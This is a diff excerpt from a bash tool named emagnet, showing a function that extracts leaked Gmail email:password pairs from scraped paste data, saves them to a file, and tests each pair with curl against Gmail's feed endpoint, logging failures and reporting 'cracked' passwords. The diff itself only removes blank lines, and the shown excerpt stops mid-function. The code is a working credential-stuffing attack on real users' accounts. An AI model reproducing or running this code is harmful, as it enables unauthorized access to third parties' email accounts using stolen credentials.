@@ -703,17 +703,14 @@ SPOTIFY_TARGETS="$HOME/.config/emagnet/tmp/.emagnet-passwords"
 emagnet_gmail_bruter() {
 if [[ eg=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S'|sed 's/|/:/g'|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v '"'\|','\|'<' |grep -i gmail.com|wc -l) -gt "0" ]]; then
 grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v /|grep -i gmail.com >> $HOME/.config/emagnet/tmp/.emagnet-passwords.txt 
-
 while read -r line; do
 attack=$(curl -s -u $line https://mail.google.com/mail/feed/atom|grep -o xml)
 mail="$(echo $line | cut -d: -f1)"
 password="$(echo $line | cut -d: -f2)"
-
     if [[ -z "$attack" ]]; then
          printf "[-] Wrong Password For $mail: \e[1;31m$password\e[0m\n"
          echo -e "[-] $(date +%d/%m/%Y\ -\ %H:%M) -> Wrong Password For $mail $mail: \e[1;31m$password\e[0m" >> "$EMAGNETLOGS/failed-to-crack.txt"
     fi
-
       if [[ -n "$attack" ]]; then
          echo -e "[+] Password Has Been Cracked $mail: \e[1;32m$password\e[0m"
          read -p "[+] Accounts to crack has been set to 1, emagnet has been killed.\n" hey
